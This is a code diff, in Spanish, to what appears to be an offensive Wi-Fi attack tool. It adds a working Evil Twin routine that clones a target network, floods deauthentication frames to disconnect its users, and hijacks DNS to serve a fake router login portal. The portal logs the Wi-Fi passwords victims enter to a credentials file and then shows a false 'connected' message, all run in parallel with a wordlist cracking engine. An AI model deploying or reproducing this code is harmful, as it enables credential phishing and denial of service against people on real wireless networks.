@@ -622,12 +622,39 @@ def modo_wizard():
     # Wordlist
     wordlist = select_wordlist() or "/usr/share/wordlists/rockyou.txt"
 
-    # ── PASO 5: Exploit Engine ────────────────────────────────────────────────
-    step(5, "Lanzando Exploit Engine automático")
-    print(f"  {DIM}Ejecutando todos los vectores de ataque con progreso en tiempo real...{END}\n")
+    # ── PASO 5: Lanzar Evil Twin en paralelo + Exploit Engine ────────────────
+    step(5, "Lanzando Exploit Engine + Evil Twin simultáneo")
+    print(f"  {DIM}Ambos ataques corren al mismo tiempo — gana el primero en obtener la clave.{END}\n")
+
+    import threading as _threading
+    _twin_result = {"clave": None}
+    _twin_stop   = _threading.Event()
+
+    def _twin_worker():
+        if check_tool("airbase-ng") and check_tool("dnsmasq"):
+            c = _evil_twin_monitor(essid, bssid, channel, mon_iface,
+                                   stop_event=_twin_stop, timeout_s=3600)
+            if c:
+                _twin_result["clave"] = c
+                _live_results_append(essid, bssid, c, "Evil Twin — portal cautivo")
+
+    _tw = _threading.Thread(target=_twin_worker, daemon=True)
+    _tw.start()
+    ok(f"Evil Twin activo — AP '{CYAN}{essid}{END}' clonado, deauth continuo corriendo")
+    print()
 
     eng = ExploitEngine(essid, bssid, channel, mon_iface, wordlist)
     clave, metodo = smart_exploit_target(eng)
+
+    # Detener Evil Twin
+    _twin_stop.set()
+    _tw.join(timeout=8)
+
+    # Si el Exploit Engine no encontró nada pero Evil Twin sí
+    if not clave and _twin_result["clave"]:
+        clave  = _twin_result["clave"]
+        metodo = "Evil Twin — portal cautivo"
+
     print()
 
     # ── PASO 6: Resultado ─────────────────────────────────────────────────────
@@ -1325,6 +1352,122 @@ def fake_ap():
     else:
         run(f"mdk3 {interfaz} b -f {diccionario} -a -s 1000 -c {channel}")
     pause_back()
+
+def _evil_twin_monitor(essid: str, bssid: str, channel: str,
+                        iface: str, stop_event=None, timeout_s: int = 600) -> str | None:
+    """
+    Evil Twin en modo monitor usando airbase-ng.
+    Puede correr en paralelo con el Exploit Engine sobre la misma interfaz.
+    Retorna la clave capturada o None.
+    """
+    import threading as _thr, queue as _queue
+    from http.server import BaseHTTPRequestHandler, HTTPServer
+    from urllib.parse import parse_qs
+
+    os.makedirs("/tmp/herradura_twin", exist_ok=True)
+    creds_file   = "/tmp/herradura_twin/creds.txt"
+    portal_path  = "/tmp/herradura_twin/index.html"
+    with open(portal_path, "w") as _f:
+        _f.write(_build_portal_html(essid, bssid))
+
+    _q         = _queue.Queue()
+    _ess       = essid
+    _creds     = creds_file
+    _ppath     = portal_path
+
+    class _H(BaseHTTPRequestHandler):
+        def log_message(self, *a): pass
+        def do_GET(self):
+            if self.path != "/":
+                self.send_response(302)
+                self.send_header("Location", "http://192.168.10.1/")
+                self.end_headers(); return
+            with open(_ppath, "rb") as _f: body = _f.read()
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.end_headers(); self.wfile.write(body)
+        def do_POST(self):
+            length = int(self.headers.get("Content-Length", 0))
+            pwd = parse_qs(self.rfile.read(length).decode(errors="replace")
+                           ).get("pass", [""])[0].strip()
+            import datetime as _dt
+            ts = _dt.datetime.now().strftime("%H:%M:%S")
+            with open(_creds, "a") as _cf:
+                _cf.write(f"[{ts}] IP={self.client_address[0]} SSID={_ess} PASS={pwd}\n")
+            _q.put(pwd)
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(b"""<!DOCTYPE html><html><head><meta charset=UTF-8>
+<style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;
+align-items:center;min-height:100vh}.b{background:#fff;padding:40px 30px;border-radius:12px;
+text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:360px;width:90%}
+.ok{font-size:52px}.h{color:#2e7d32}.p{color:#666;font-size:14px}</style></head>
+<body><div class=b><div class=ok>&#x2705;</div><h2 class=h>Conectado correctamente</h2>
+<p class=p>Su dispositivo se reconect&#xF3; a la red.<br>Redirigiendo...</p>
+<script>setTimeout(()=>location.href='http://google.com',3000)</script>
+</div></body></html>""")
+
+    # Iniciar airbase-ng (crea at0 en modo monitor)
+    ab_proc = subprocess.Popen(
+        f"airbase-ng -e '{essid}' -c {channel} {iface} 2>/dev/null",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    time.sleep(3)
+
+    # Configurar at0
+    run("ip addr flush dev at0 2>/dev/null", capture=True)
+    run("ip addr add 192.168.10.1/24 dev at0 2>/dev/null", capture=True)
+    run("ip link set at0 up 2>/dev/null", capture=True)
+
+    # dnsmasq en at0
+    with open("/tmp/herradura_twin/dnsmasq_at0.conf", "w") as _f:
+        _f.write("interface=at0\ndhcp-range=192.168.10.10,192.168.10.100,"
+                 "255.255.255.0,10m\ndhcp-option=3,192.168.10.1\n"
+                 "dhcp-option=6,192.168.10.1\naddress=/#/192.168.10.1\nno-resolv\n")
+    dm_proc = subprocess.Popen(
+        ["dnsmasq", "-C", "/tmp/herradura_twin/dnsmasq_at0.conf", "--no-daemon"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    time.sleep(1)
+
+    # HTTP servidor portal
+    try:
+        httpd = HTTPServer(("192.168.10.1", 80), _H)
+    except OSError:
+        run("fuser -k 80/tcp 2>/dev/null", capture=True)
+        time.sleep(1)
+        httpd = HTTPServer(("192.168.10.1", 80), _H)
+    _thr.Thread(target=httpd.serve_forever, daemon=True).start()
+
+    # Deauth continuo en background
+    deauth_proc = subprocess.Popen(
+        f"aireplay-ng -0 0 -a {bssid} {iface} 2>/dev/null",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+
+    # Esperar credencial o señal de stop
+    captured = None
+    deadline = time.time() + timeout_s
+    while time.time() < deadline:
+        if stop_event and stop_event.is_set():
+            break
+        try:
+            captured = _q.get(timeout=3)
+            break
+        except Exception:
+            pass
+
+    # Limpieza
+    deauth_proc.terminate()
+    ab_proc.terminate(); ab_proc.wait()
+    dm_proc.terminate(); dm_proc.wait()
+    httpd.shutdown()
+    run("ip link set at0 down 2>/dev/null; ip addr flush dev at0 2>/dev/null",
+        capture=True)
+
+    return captured
+
 
 def _build_portal_html(essid: str, bssid: str) -> str:
     """Genera HTML del portal cautivo imitando la UI del router según la marca."""
